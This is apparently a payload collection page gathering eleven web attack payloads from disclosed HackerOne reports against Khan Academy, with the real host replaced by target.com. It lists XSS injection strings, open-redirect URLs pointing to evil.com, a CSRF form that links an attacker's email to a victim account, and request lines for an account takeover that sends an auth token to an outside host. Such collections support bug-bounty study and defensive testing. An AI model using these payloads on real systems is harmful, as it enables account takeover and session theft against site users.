# Khan Academy

11 payloads.

### `96ef5d47`

```
" onclick="alert(1)
```

— [http://target.com/search-results.html XSS](https://hackerone.com/reports/6344) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `5cbc58ff`

```
https://target.com/login?continue=http://evil.com
```

**Parameter:** `continue`
— [https://target.com/login open-redirect](https://hackerone.com/reports/6357) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `eaeb7748`

```
https://target.com/login?continue=http:/evil.com
```

**Parameter:** `continue`
— [https://target.com/login open-redirect](https://hackerone.com/reports/6357) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `72a8f7cd`

```
"><img src=x onerror=alert(4)>
```

— [https://target.com/coach/reports/activity XSS](https://hackerone.com/reports/6409) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `a79894c7`

```
</script>"><img src=x onerror=alert(0)>
```

— [Persistent class XSS \[the fuck\]](https://hackerone.com/reports/6412) · Khan Academy · [smiegles](https://hackerone.com/smiegles)

### `46dc536c`

```
<html>
  <body>
    <form action="https://target.com/settings/linkemail" method="POST">
      <input type="hidden" name="fkey" value="CSRF_token" />
      <input type="hidden" name="email" value="[attacker-email-address]" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

**Parameter:** `email`
— [CSRF token fixation and potential account takeover](https://hackerone.com/reports/308394) · Khan Academy · [co0nan](https://hackerone.com/co0nan)

### `0a7eec4d`

```
<svg ... onload="alert('SIKN')">...</svg>
```

— [XSS on using the legacy "Graphie To Png" API](https://hackerone.com/reports/2846011) · Khan Academy · [sikn](https://hackerone.com/sikn)

### `62ab1a0f`

```
{
	"labels": [
		{
			"content": "<script>alert('SIKN')</script>",
			"typesetAsMath": false,
			...
		},
		...
	],
	...
}
```

— [XSS on using the legacy "Graphie To Png" API](https://hackerone.com/reports/2846011) · Khan Academy · [sikn](https://hackerone.com/sikn)

### `cac2a421`

```
https://target.com/login?continue=https%3A%2F%2Fevil.com%2F
```

**Parameter:** `continue`
— [1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation](https://hackerone.com/reports/3723458) · Khan Academy · [farr](https://hackerone.com/farr)

### `0767ae93`

```
GET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1
Host: xfarr-6fmjyrz2lq-uc-a-run.app
```

**Parameter:** `continue`
— [1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation](https://hackerone.com/reports/3723458) · Khan Academy · [farr](https://hackerone.com/farr)

### `479c3c86`

```
https://target.com/transfer_auth?key=<TOKEN>&continue=/
```

**Parameter:** `continue`
— [1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation](https://hackerone.com/reports/3723458) · Khan Academy · [farr](https://hackerone.com/farr)
